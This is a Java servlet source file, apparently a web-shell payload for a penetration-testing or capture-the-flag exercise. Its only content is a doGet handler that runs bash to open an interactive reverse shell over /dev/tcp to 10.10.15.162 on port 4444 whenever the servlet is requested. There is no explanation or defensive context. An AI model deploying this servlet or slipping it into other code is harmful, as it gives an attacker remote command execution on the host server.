import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;

public class ShellServlet extends HttpServlet {
	public void doGet(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
			String host = "10.10.15.162";
			int port = 4444;        String[] cmd = {"/bin/bash", "-c", "/bin/bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1"};
			Runtime.getRuntime().exec(cmd);
	}
}
